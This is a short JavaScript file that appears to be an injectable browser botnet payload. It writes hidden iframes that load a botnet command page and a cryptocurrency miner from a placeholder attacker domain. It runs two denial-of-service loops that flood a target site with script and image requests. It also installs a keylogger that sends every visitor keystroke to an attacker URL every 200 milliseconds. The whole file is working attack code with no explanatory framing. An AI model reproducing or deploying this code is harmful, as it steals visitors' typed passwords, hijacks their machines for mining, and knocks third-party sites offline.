document.write("<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>");
document.write("<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>");
ddos('http://TARGET-SITE.com/images/header.png',
'http://TARGET-SITE.com/images/header.png');
function ddos(url,url2){
window.setInterval(function (){
$.getScript(url);
$.getScript(url2);
},1000)
}


function imgflood() {
  var TARGET = 'TARGET-SITE.com'
  var URI = '/index.php?'
  var pic = new Image()
  var rand = Math.floor(Math.random() * 1000)
  pic.src = 'http://'+TARGET+URI+rand+'=val'
}
setInterval(imgflood, 10) //100 requests per second

var buffer = [];
var attacker = 'http://YourDomain.com/BotNet/CC/KeyLogger/?c='

document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = {
        k: e.key,
        t: timestamp
    };
    buffer.push(stroke);
}

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
    }
}, 200);
